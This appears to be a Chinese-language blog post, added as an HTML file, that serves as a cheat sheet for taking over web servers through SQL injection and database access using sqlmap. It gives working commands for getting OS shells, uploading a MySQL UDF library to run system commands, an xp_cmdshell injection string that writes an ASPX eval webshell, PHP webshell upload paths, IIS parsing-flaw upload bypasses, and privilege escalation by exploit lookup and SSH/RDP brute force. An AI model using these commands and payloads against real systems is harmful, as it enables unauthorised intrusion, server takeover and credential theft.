@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />   
+  <style type="text/css">
+    .day {
+     background-color:rgb(97,214,214);
+    }
+    .night {
+     background-color:rgb(255,157,173);
+ }
+</style> 
+ </head> 
+ <body> 
+  <script type="text/javascript">
+ 
+i = 1
+function changeBackGround()
+{
+  i++;
+  if (i % 2 == 0) {
+    switchClass('night');
+  }
+  else {
+    switchClass('day');
+  }
+
+  setTimeout("changeBackGround()", 1000)
+}
+
+function switchClass(name)
+{
+  document.body.className =name;
+}
+changeBackGround()
+</script> 
+<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
+<p>渗透思路千万条，只要有一条通往成功获取webshell的道路即可，所以不必一定纠结于必须要使用sqlmap</p>
+<p><span style="color: rgba(255, 0, 0, 1)"><strong>一. sqlmap获取webshell及提权常见命令</strong></span></p>
+<p>1. sqlmap常见获取webshell的相关命令</p>
+<p>(1) MSSQL判断是否是DBA权限</p>
+<p>--is-dba</p>
+<p>(2) 数据库交互模式shell</p>
+<p>--sql-shell</p>
+<p>(3) 操作系统交互命令</p>
+<p>--os-cmd=net user 这里一般是Windows的DOS命令或者Linux的终端命令</p>
+<p>(4) 文件读取和写入命令</p>
+<p>--file-read=RFILE&nbsp; 从后台数据库管理系统中读取文件</p>
+<p>--file-write=WFILE&nbsp; 编辑后端数据库管理系统上的本地文件WFILE</p>
+<p>--file-dest=DFILE&nbsp; 后端数据库管理系统写入文件的绝对路径</p>
+<p>(5) 数据库权限提升</p>
+<p>--priv-esc 数据库进程用户权限提升</p>
+<p>(6) meterpreter提权(作者说实际测试并未成功过，可以当作一个思路来记录)</p>
+<p>--os-pwn&nbsp; 获取一个OOB shell ， meterpreter或者VNC</p>
+<p>--os-smbrelay 一键获取一个OOB shell ，meterpreter或者VNC</p>
+<p>--os-bof 存储过程缓冲区溢出利用</p>
+<p>(7) 获取数据库root账号密码及其他账号密码，sa权限用户获取当前MSSQL下用户密码</p>
+<p>--passwords 枚举数据库管理系统用户密码哈希值，程序会自动对密码进行破解，破解不了会列出hash让你自己破解</p>
+<p>&nbsp;</p>
+<p>2. MySQL数据库直接连接提权</p>
+<p>sqlmap.py -d mysql://root:root@xx.xx.xx.xx:3306/test --os-shell</p>
+<p>&nbsp;</p>
+<p>3. MySQL数据库sql-shell下UDF提权</p>
+<p>(1) 连接数据库</p>
+<p>sqlmap.py -d mysql://root:root@xx.xx.xx.xx:3306/test --sql-shell</p>
+<p>(2) 查看版本</p>
+<p>select @@version;</p>
+<p>(3) 查看插件目录</p>
+<p>select @@plugin_dir;</p>
+<p>(4) 操作sqlmap上传lib_mysqludf_sys到MySQL插件目录</p>
+<p>sqlmap.py -d mysql:root:root@xx.xx.xx.xx:3306/test --file-write=D:/tmp/lib_mysqludf_sys.dll --file-dest=D::\\phpstudy\\bin\\mysql\\lib\plugin\\lib_mysqludf_sys.dll</p>
+<p>(5) 创建sys_exec函数</p>
+<p>CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.dll'</p>
+<p>(6) 创建sys_eval函数</p>
+<p>CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll'</p>
+<p>(7) 执行命令</p>
+<p>select sys_eval('ver');</p>
+<p>select sys_eval('whoami');</p>
+<p>select sys_eval('net user');</p>
+<p>&nbsp;</p>
+<p>4. MSSQL直连数据库</p>
+<p>1. 安装所需要的模块</p>
+<p>pip install pymssql</p>
+<p>pip install pyodbc</p>
+<p>apt-get install unixodbc -y</p>
+<p>按照上述安装，还是不成功，大家可以自己测试下，连接MSSQL数据库Windows下好多好用的连接工具</p>
+<p>&nbsp;</p>
+<p><strong><span style="color: rgba(255, 0, 0, 1)">二. 直连获取shell</span>(获取webshell或shell条件)</strong></p>
+<p>sqlmap -d mssql://sa:sa@192.168.91.131:1433/master --os-shell</p>
+<p>1. PHP+MySQL类型网站获取webshell</p>
+<p>(1) MySQL root账号权限，即配置MySQL连接的账号为root账号，不是root账号具备root权限也可</p>
+<p>(2) GPC配置关闭，能使用单引号</p>
+<p>(3) 有网站的绝对路径，且具备可以在文件夹写入文件的权限</p>
+<p>(4) 没有配置secure-file-priv属性</p>
+<p>&nbsp;</p>
+<p>2. MSSQL+ASP/ASP.net类型网站获取webshell条件</p>
+<p>(1) 数据库用户是sa</p>
+<p>(2) 能够创建xp_cmdshell</p>
+<p>(3) 知道真实路径</p>
+<p>(4) 可以通过echo命令生成shell</p>
+<p>';exec master..xp_cmdshell 'echo ^&lt;%@ Page Language="Jscript"%^&gt;^&lt;%eval (Request.Item["bmfx"], "unsafe");%^ &gt;&gt; C:\tools\fx.aspx';--</p>
+<p>&nbsp;</p>
+<p><span style="color: rgba(255, 0, 0, 1)"><strong>三. 获取webshell权限思路及命令</strong></span></p>
+<p>1. PHP类型网站获取webshell权限思路</p>
+<p>(1) 获取os-shell</p>
+<p>sqlmap.py -u "http://www.xxx.com/index.php?id=2" --os-shell</p>
+<p>(2) 选择4PHP类型的语言</p>
+<p>(3) 物理路径的选择</p>
+<p>普通路径，指定路径，指定字典文件进行暴力破解，暴力搜索地址</p>
+<p>(4) 获取webshell</p>
+<p>在sqlmap中无法直接获取webshell，如果--os-shell整个命令执行完成，就会上传两个文件，sqlmap会给你提示上传的文件名，一个文件是后门文件，可以通过参数传递命令直接执行shell，另一个文件是文件上传功能页面，访问这个页面可以直接上传文件</p>
+<p>(5) PHP获取webshell难点</p>
+<p>在整个过程中获取网站的真实物理路径是最重要的，一般可以通过phpinfo函数，测试页面，及报错信息，搜素引擎，目录爆破的方式来获取网站的真实物理路径，如果获取到了管理员的账号，能够登录后台，如果后台有一些探针功能或者是系统运行情况的页面，那么也可以获取真实的物理路径，如果实在无法获取那只能暴力猜解或者社工等其他方式。</p>
+<p>&nbsp;</p>
+<p>2. 直接写入webshell到网站</p>
+<p>sqlmap.py -u "http://www.xxx.com/index.php?id=3" --file-write /opt/bmfx.php --file-dest /var/www/html/shell.php</p>
+<p>bmfx.php是攻击者本地文件，shell.php是上传到目标站点的文件名称</p>
+<p>&nbsp;</p>
+<p>3. os-shell下载文件执行</p>
+<p>&nbsp;</p>
+<p>4. 通过sqlmap连接MySQL获取shell</p>
+<p>&nbsp;</p>
+<p>5. 账号登录管理后台，寻找上传点</p>
+<p>(1) 后台直接上传webshell</p>
+<p>(2) 抓包构建绕过防护上传webshell</p>
+<p>(3) IIS 6 畸形文件漏洞绕过，即上传1.asp;jpg图片一句话</p>
+<p>(4) IIS 7 CGI解析漏洞，上传webshell图片文件，访问http://www.xxx.com/1.jpg/1.php</p>
+<p>(5) FCK文件两次上传获取webshell</p>
+<p>(6) 其他上传漏洞获取webshell</p>
+<p>&nbsp;</p>
+<p><span style="color: rgba(255, 0, 0, 1)"><strong>四. 获取system权限思路</strong></span></p>
+<p>1. MSSQL和MySQL数据库获取system权限</p>
+<p>(1) 生成系统信息</p>
+<p>systeminfo &gt; bmfx.txt</p>
+<p>(2) 使用windows-exploit-suggester.py 检查是否存在未打补丁的漏洞</p>
+<p>(3) 找到漏洞对应exp直接提权</p>
+<p>2. 直接获取system权限</p>
+<p>有些服务器是直接使用高权限启动服务，可以通过sqlmap直接获取系统权限</p>
+<p>3. 社工提权</p>
+<p>有些root/sa账号对应的数据库密码就是系统Windows/Linux系统的管理员密码</p>
+<p>4. 密码账号暴力破解</p>
+<p>通过前面获取到系统准确的账号信息，可以尝试SSH/RDP账号的暴力破解</p>
+</div>
+ </body>
+</html>
